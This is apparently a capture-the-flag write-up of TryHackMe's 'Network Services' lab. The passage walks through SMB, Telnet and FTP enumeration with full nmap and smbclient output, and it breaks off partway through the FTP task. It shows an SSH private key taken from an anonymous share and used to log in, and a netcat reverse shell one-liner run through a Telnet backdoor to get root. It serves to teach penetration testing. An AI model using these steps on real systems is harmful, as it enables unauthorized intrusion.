# Network Services

Learn about, then enumerate and exploit a variety of network services and misconfigurations.

[Network Services](https://tryhackme.com/room/networkservices)

## Topic's

- SMB Fundamentals
- SMB Enumeration
- SMB Exploitation
- Telnet Fundamentals
- Telnet Enumeration
- Telnet Exploitation
- FTP Fundamentals
- FTP Enumeration
- FTP Exploitation

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Get Connected

Hello and welcome!

This room will explore common Network Service vulnerabilities and misconfigurations, but in order to do that, we'll need to do a few things first!

A basic knowledge of Linux, and how to navigate the Linux file system, is required for this room. If you think you'll need some help with this, try completing the 'Learn Linux' room ([https://tryhackme.com/room/zthlinux](https://tryhackme.com/room/zthlinux))

1. Connect to the TryHackMe OpenVPN Server (See [https://tryhackme.com/access](https://tryhackme.com/access) for help!)
2. Make sure you're sitting comfortably, and have a cup of Tea, Coffee or Water close!

Now, let's move on!

N.B. This is not a room on WiFi access hacking or hijacking, rather how to gain unauthorized access to a machine by exploiting network services. If you are interested in WiFi hacking, I suggest checking out WiFi Hacking 101 by NinjaJc01 ([https://tryhackme.com/room/wifihacking101](https://tryhackme.com/room/wifihacking101))

1. Ready? Let's get going!

`No answer needed`

## Task 2 Understanding SMB

**What is SMB?**

SMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. [[source](https://searchnetworking.techtarget.com/definition/Server-Message-Block-Protocol)]

Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.

The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.

**How does SMB work?**

![](https://i.imgur.com/XMnru12.png)

Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system. However, in the case of SMB, these things are done over the network.

**What runs SMB?**

Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support. Samba, an open source server that supports the SMB protocol, was released for Unix systems.

1. What does SMB stand for?

`Server Message Block`

2. What type of protocol is SMB?

`response-request`

3. What do clients connect to servers using?

`TCP/IP`

4. What systems does Samba run on?

`Unix`

## Task 3 Enumerating SMB

**Lets Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!

**Enumeration**

Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.

This process is essential for an attack to be successful, as wasting time with exploits that either don't work or can crash the system can be a waste of energy. Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.

**SMB**

Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information — you'd be surprised what is sometimes included on these shares.

**Port Scanning**

The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine. You can go as in depth as you like on this, however I suggest using `nmap` with the `-A` and `-p-` tags.

- -A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one
- -p- : Enables scanning across all ports, not just the top 1000

If you'd like to learn more about nmap in more detail, I **recommend** checking out DarkStar's room on the topic, as part of the Red Primer series [here](https://tryhackme.com/room/rpnmap).

**Enum4Linux**

Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. It's installed by default on Parrot and Kali, however if you need to install it, you can do so from the official [github](https://github.com/portcullislabs/enum4linux).

The syntax of Enum4Linux is nice and simple: "`enum4linux [options] ip`"

| TAG | FUNCTION                                    |
| --- | ------------------------------------------- |
| -U  | get userlist                                |
| -M  | get machine list                            |
| -N  | get namelist dump (different from -U and-M) |
| -S  | get sharelist                               |
| -P  | get password policy information             |
| -G  | get group and member list                   |
|     |                                             |
| -A  | all of the above (full basic enumeration)   |

Now we understand our enumeration tools, lets get started!

```
kali@kali:~/CTFs/tryhackme/Network Services$ sudo nmap -A -p- -sS -sC -sV -O 10.10.78.132
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-22 00:33 CEST
Nmap scan report for 10.10.78.132
Host is up (0.038s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 91:df:5c:7c:26:22:6e:90:23:a7:7d:fa:5c:e1:c2:52 (RSA)
|   256 86:57:f5:2a:f7:86:9c:cf:02:c1:ac:bc:34:90:6b:01 (ECDSA)
|_  256 81:e3:cc:e7:c9:3c:75:d7:fb:e0:86:a0:01:41:77:81 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/22%OT=22%CT=1%CU=39565%PV=Y%DS=2%DC=T%G=Y%TM=5F90B7
OS:6B%P=x86_64-pc-linux-gnu)SEQ(SP=F3%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1
OS:1NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
|_nbstat: NetBIOS name: POLOSMB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: polosmb
|   NetBIOS computer name: POLOSMB\x00
|   Domain name: \x00
|   FQDN: polosmb
|_  System time: 2020-10-21T22:34:18+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-10-21T22:34:18
|_  start_date: N/A

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   36.96 ms 10.8.0.1
2   36.97 ms 10.10.78.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.23 seconds
```

1. Conduct an **nmap** scan of your choosing, How many ports are open?

`3`

2. What ports is **SMB** running on?

`139/445`

3. Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the **workgroup** name?

```
kali@kali:~/CTFs/tryhackme/Network Services$ enum4linux 10.10.78.132
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct 22 00:36:05 2020

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.78.132
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================
|    Enumerating Workgroup/Domain on 10.10.78.132    |
 ====================================================
[+] Got domain/workgroup name: WORKGROUP
```

`WORKGROUP`

4. What comes up as the **name** of the machine?

`POLOSMB`

5. What operating system **version** is running?

`6.1`

6. What share sticks out as something we might want to investigate?

```
kali@kali:~/CTFs/tryhackme/Network Services$ smbclient -L //10.10.78.132
Enter WORKGROUP\kali's password:

        Sharename       Type      Comment
        ---------       ----      -------
        netlogon        Disk      Network Logon Service
        profiles        Disk      Users profiles
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

`profiles`

## Task 4 Exploiting SMB

**Types of SMB Exploit**

While there are vulnerabilities such as [CVE-2017-7494](https://www.cvedetails.com/cve/CVE-2017-7494/) that can allow remote code execution by exploiting SMB, you're more likely to encounter a situation where the best way into a system is due to misconfigurations in the system. In this case, we're going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.

**Method Breakdown**

So, from our enumeration stage, we know:

- The SMB share location
- The name of an interesting SMB share

**SMBClient**

Because we're trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it's part of the default samba suite. While it is available by default on Kali and Parrot, if you do need to install it, you can find the documentation here.

We can remotely access the SMB share using the syntax:

"`smbclient //[IP]/[SHARE]`"

Followed by the tags:

- `-U [name]` : to specify the user
- `-p [port]` : to specify the port

**Got it? Okay, let's do this!**

1. What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

`smbclient //10.10.10.2/secret -U suit -p 139`

2. Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability.

```
kali@kali:~/CTFs/tryhackme/Network Services$ smbclient //10.10.78.132/profiles
Enter WORKGROUP\kali's password:
Try "help" to get a list of possible commands.
smb: \>
```

`No answer needed`

3. Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:

- using the username "Anonymous"
- connecting to the share we found during the enumeration stage
- and not supplying a password.

Does the share allow anonymous access? Y/N?

`Y`

4. Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?

```
smb: \> ls
  .                                   D        0  Tue Apr 21 13:08:23 2020
  ..                                  D        0  Tue Apr 21 12:49:56 2020
  .cache                             DH        0  Tue Apr 21 13:08:23 2020
  .profile                            H      807  Tue Apr 21 13:08:23 2020
  .sudo_as_admin_successful           H        0  Tue Apr 21 13:08:23 2020
  .bash_logout                        H      220  Tue Apr 21 13:08:23 2020
  .viminfo                            H      947  Tue Apr 21 13:08:23 2020
  Working From Home Information.txt      N      358  Tue Apr 21 13:08:23 2020
  .ssh                               DH        0  Tue Apr 21 13:08:23 2020
  .bashrc                             H     3771  Tue Apr 21 13:08:23 2020
  .gnupg                             DH        0  Tue Apr 21 13:08:23 2020

                12316808 blocks of size 1024. 7583776 blocks available
smb: \> get "Working From Home Information.txt"
getting file \Working From Home Information.txt of size 358 as Working From Home Information.txt (2.4 KiloBytes/sec) (average 2.4 KiloBytes/sec)
```

```
kali@kali:~/CTFs/tryhackme/Network Services$ cat Working\ From\ Home\ Information.txt
John Cactus,

As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever
possible, employees should work from home. As such- your account has now been enabled with ssh
access to the main server.

If there are any problems, please contact the IT department at it@polointernalcoms.uk

Regards,

James
Department Manager
```

`John Cactus`

5. What service has been configured to allow him to work from home?

`ssh`

6. Okay! Now we know this, what directory on the share should we look in?

```
smb: \> cd .ssh
smb: \.ssh\> ls
  .                                   D        0  Tue Apr 21 13:08:23 2020
  ..                                  D        0  Tue Apr 21 13:08:23 2020
  id_rsa                              A     1679  Tue Apr 21 13:08:23 2020
  id_rsa.pub                          N      396  Tue Apr 21 13:08:23 2020
  authorized_keys                     N        0  Tue Apr 21 13:08:23 2020

                12316808 blocks of size 1024. 7584028 blocks available
smb: \.ssh\>
```

`.ssh`

7. This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

`id_rsa`

8. Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]".

Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.

What is the smb.txt flag?

```
kali@kali:~/CTFs/tryhackme/Network Services$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDb7OaL8zLZ5Z8OU3wZPSIQHaoyI8Yc3I/8/Y6faWgYTZbfNPexli0jxdAeTeGy2X3XACWcB4HFejbiNsMYLjy517gwWKPBvN865i8uIQ0Gqayq/KmBHpuBbR0yX/SpyfyvzR3VD16pg/D+WT8hLaNHSYm6FNYLsmVnWDSJDBhS179czftuoW55mw/OqzWVr5ln9cKeeuXlNV1lqCjBqF3ClzEBvN4JW8GS/riLTeHcXeMIMUTuIpr4XovN/VivIlLqTYy7lHuUh6L2RqAfw5+FSr4QZW1zHCMoS6FooTomq/03EGJCGcp80/fT0e04n+7+PxnmvZQkOwe1A1hUG6C/ cactus@polosmb
```

```
kali@kali:~/CTFs/tryhackme/Network Services$ ssh -i id_rsa cactus@10.10.78.132
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 21 22:57:37 UTC 2020

  System load:  0.0                Processes:           93
  Usage of /:   33.3% of 11.75GB   Users logged in:     0
  Memory usage: 17%                IP address for eth0: 10.10.78.132
  Swap usage:   0%


22 packages can be updated.
0 updates are security updates.


Last login: Tue Apr 21 11:19:15 2020 from 192.168.1.110
cactus@polosmb:~$ ls
smb.txt
cactus@polosmb:~$ cat smb.txt
THM{smb_is_fun_eh?}
cactus@polosmb:~$
```

`THM{smb_is_fun_eh?}`

## Task 5 Understanding Telnet

**What is Telnet?**

Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.

The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.

**Replacement**

Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.

**How does Telnet work?**

The user connects to the server by using the Telnet protocol, which means entering "telnet" into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: "telnet [ip] [port]"

1. What is Telnet?

`application protocol`

2. What has slowly replaced Telnet?

`SSH`

3. How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?

`telnet 10.10.10.3 23`

4. The lack of what, means that all Telnet communication is in plaintext?

`encryption`

## Task 6 Enumerating Telnet

**Lets Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!

**Enumeration**

We've already seen how key enumeration can be in exploiting a misconfigured network service. However, vulnerabilities that could be potentially trivial to exploit don't always jump out at us. For that reason, especially when it comes to enumerating network services, we need to be thorough in our method.

**Port Scanning**

Let's start out the same way we usually do, a port scan, to find out as much information as we can about the services, applications, structure and operating system of the target machine. Scan the machine with nmap and the tag -A and -p-.

**Tag**

- -A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one
- -p- : Enables scanning across all ports, not just the top 1000

**Output**

Let's see what's going on on the target server...

```
kali@kali:~/CTFs/tryhackme/Network Services$ sudo nmap -p- -sS -sC -sV -Pn -O 10.10.221.224
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 20:49 CET
Nmap scan report for 10.10.221.224
Host is up (0.037s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
8012/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
|_    SKIDY'S BACKDOOR. Type .HELP to view commands
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8012-TCP:V=7.80%I=7%D=10/25%Time=5F95D704%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comman
SF:ds\n")%r(GenericLines,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to
SF:\x20view\x20commands\n")%r(GetRequest,2E,"SKIDY'S\x20BACKDOOR\.\x20Type
SF:\x20\.HELP\x20to\x20view\x20commands\n")%r(HTTPOptions,2E,"SKIDY'S\x20B
SF:ACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(RTSPRequest
SF:,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\
SF:n")%r(RPCCheck,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20vie
SF:w\x20commands\n")%r(DNSVersionBindReqTCP,2E,"SKIDY'S\x20BACKDOOR\.\x20T
SF:ype\x20\.HELP\x20to\x20view\x20commands\n")%r(DNSStatusRequestTCP,2E,"S
SF:KIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(
SF:Help,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comma
SF:nds\n")%r(SSLSessionReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20
SF:to\x20view\x20commands\n")%r(TerminalServerCookie,2E,"SKIDY'S\x20BACKDO
SF:OR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(TLSSessionReq,2E
SF:,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")
SF:%r(Kerberos,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x
SF:20commands\n")%r(SMBProgNeg,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP
SF:\x20to\x20view\x20commands\n")%r(X11Probe,2E,"SKIDY'S\x20BACKDOOR\.\x20
SF:Type\x20\.HELP\x20to\x20view\x20commands\n")%r(FourOhFourRequest,2E,"SK
SF:IDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(L
SF:PDString,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20c
SF:ommands\n")%r(LDAPSearchReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP
SF:\x20to\x20view\x20commands\n")%r(LDAPBindReq,2E,"SKIDY'S\x20BACKDOOR\.\
SF:x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(SIPOptions,2E,"SKIDY'
SF:S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LANDe
SF:sk-RC,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comm
SF:ands\n")%r(TerminalServer,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x
SF:20to\x20view\x20commands\n")%r(NCP,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x2
SF:0\.HELP\x20to\x20view\x20commands\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/25%OT=8012%CT=1%CU=38185%PV=Y%DS=2%DC=I%G=Y%TM=5F95
OS:D7AA%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508
OS:ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
OS:ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.59 seconds
```

1. How many ports are open on the target machine?

`1`

2. What port is this?

`8012`

3. This port is unassigned, but still lists the protocol it's using, what protocol is this?

`tcp`

4. Now re-run the nmap scan, without the -p- tag, how many ports show up as open?

`0`

5. Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.

`No answer needed`

6. Based on the title returned to us, what do we think this port could be used for?

`A Backdoor`

7. Who could it belong to? Gathering possible usernames is an important step in enumeration.

`SKIDY`

8. Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.

## Task 7 Exploiting Telnet

**Types of Telnet Exploit**

Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:

- [https://www.cvedetails.com/](https://www.cvedetails.com/)
- [https://cve.mitre.org/](https://cve.mitre.org/)

A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.

However, you're far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it.

**Method Breakdown**

So, from our enumeration stage, we know:

- There is a poorly hidden telnet service running on this machine
- The service itself is marked "backdoor"
- We have possible username of "Skidy" implicated

Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!

**Connecting to Telnet**

You can connect to a telnet server with the following syntax: "`telnet [ip] [port]`"

We're going to need to keep this in mind as we try and exploit this machine.

**What is a Reverse Shell?**

![](https://i.imgur.com/EUC7VS6.png)

A "shell" can simply be described as a piece of code or program which can be used to gain code or command execution on a device.

A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.

The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.

1. Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.

`No answer needed`

2. Great! It's an open telnet connection! What welcome message do we receive?

```
kali@kali:~/CTFs/tryhackme/Network Services$ telnet 10.10.221.224 8012
Trying 10.10.221.224...
Connected to 10.10.221.224.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
```

`SKIDY'S BACKDOOR.`

3. Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)

`N`

4. Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.

`No answer needed`

5. Start a tcpdump listener on your local machine using: "sudo tcpdump ip proto \\icmp -i tun0" This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

`No answer needed`

6. Now, use the command "ping [local tun0 ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)

```
kali@kali:~/CTFs/tryhackme/Network Services$ ping 10.8.106.222 -c 1
PING 10.8.106.222 (10.8.106.222) 56(84) bytes of data.
64 bytes from 10.8.106.222: icmp_seq=1 ttl=64 time=0.027 ms

--- 10.8.106.222 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.027/0.027/0.027/0.000 ms
```

7. Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!
8. We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax: "`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`"

- `-p` = payload
- `lhost` = our local host IP address
- `lport` = the port to listen on
- `R` = export the payload in raw format

What word does the generated payload start with?

```
kali@kali:~/CTFs/tryhackme/Network Services$ msfvenom -p cmd/unix/reverse_netcat lhost=10.8.106.222 lport=4444 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 102 bytes
mkfifo /tmp/itxhqvx; nc 10.8.106.222 4444 0</tmp/itxhqvx | /bin/sh >/tmp/itxhqvx 2>&1; rm /tmp/itxhqvx
```

`mkfifo`

9. Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using: "`nc -lvp [listening port]`" What would the command look like for the listening port we selected in our payload?

```
kali@kali:~/CTFs/tryhackme/Network Services$ nc -lvp 4444
Listening on 0.0.0.0 4444
```

`nc -lvp 4444`

10. Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!

```
.RUN mkfifo /tmp/itxhqvx; nc 10.8.106.222 4444 0</tmp/itxhqvx | /bin/sh >/tmp/itxhqvx 2>&1; rm /tmp/itxhqvx
```

`No answer needed`

1.  Success! What is the contents of flag.txt?

```
kali@kali:~/CTFs/tryhackme/Network Services$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.221.224 56944
id
uid=0(root) gid=0(root) groups=0(root)
ls
flag.txt
cat flag.txt
THM{y0u_g0t_th3_t3ln3t_fl4g}
```

`THM{y0u_g0t_th3_t3ln3t_fl4g}`

## Task 8 Understanding FTP

**What is FTP?**

File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.

**How does FTP work?**

A typical FTP session operates using two channels:

- a command (sometimes called the control) channel
- a data channel.

As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.

FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.

While the session is open, the client may execute FTP commands on the server.

**Active vs Passive**

The FTP server may support either Active or Passive connections, or both.

- In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it.
- In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.

This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections.

**More Details:**

You can find more details on the technical function, and implementation of, FTP on the Internet Engineering Task Force website: [https://www.ietf.org/rfc/rfc959.txt](https://www.ietf.org/rfc/rfc959.txt). The IETF is one of a number of standards agencies, who define and regulate internet standards.

1. What communications model does FTP use?

`client-server`

2. What's the standard FTP port?

`21`

3. How many modes of FTP connection are there?

`2`

## Task 9 Enumerating FTP

**Lets Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!

**Enumeration**

By now, I don't think I need to explain any further how enumeration is key when attacking network services and protocols. You should, by now, have enough experience with **nmap** to be able to port scan effectively. If you get stuck using any tool- you can always use "`tool [-h / -help / --help]`" to find out more about it's function and syntax. Equally, man pages are extremely useful for this purpose. They can be reached using "`man [tool]`".

**Method**

We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system. This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.

**Resources**

As we're going to be logging in to an FTP server, we're going to need to make sure therre is an ftp client installed on the system. There should be one installed by default on most Linux operating systems, such as Kali or Parrot OS. You can test if there is one by typing "ftp" into the console. If you're bought to a prompt that says: "ftp>" Then you have a working FTP client on your system. If not, it's a simple matter of using "sudo apt install ftp" to install one.

**Alternative Enumeration Methods**

It's worth noting that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the "cwd" command for home directories which exist and those that don’t. This can be exploited because you can issue cwd commands before authentication, and if there's a home directory- there is more than likely a user account to go with it. While this bug is found mainly within legacy systems, it's worth knowing about, as a way to exploit FTP.

This vulnerability is documented at: [https://www.exploit-db.com/exploits/20745](https://www.exploit-db.com/exploits/20745)

Now we understand our toolbox, let's do this.

1. Run an nmap scan of your choice. How many ports are open on the target machine?

```
kali@kali:~/CTFs/tryhackme/Network Services$ sudo nmap -p- -sS -sC -sV -O 10.10.153.14
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 22:05 CET
Nmap scan report for 10.10.153.14
Host is up (0.033s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
